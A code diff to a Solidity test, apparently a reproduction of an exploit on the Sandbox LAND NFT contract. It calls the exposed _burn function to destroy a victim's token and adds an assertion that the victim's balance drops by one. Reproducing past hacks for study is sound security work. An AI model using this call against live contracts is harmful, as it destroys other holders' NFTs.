@@ -27,12 +27,15 @@ contract Exploit_SandBox is TestHarness{
     }
 
     function test_attack() external {
+        uint256 numOfNFTsVictimBefore = land._numNFTPerAddress(victim);
         console.log('------- INITIAL NFT BALANCE OF VICTIM -------');
-        console.log(land._numNFTPerAddress(victim));
+        console.log(numOfNFTsVictimBefore);
 
-        cheat.prank(attacker);
+        
         land._burn(victim, victim, 3738);
+        uint256 numOfNFTsVictimAfter = land._numNFTPerAddress(victim);
         console.log('------- FINAL NFT BALANCE OF VICTIM -------');
-        console.log(land._numNFTPerAddress(victim));
+        console.log(numOfNFTsVictimAfter);
+        assertEq(numOfNFTsVictimBefore, numOfNFTsVictimAfter+1);
     }
 }
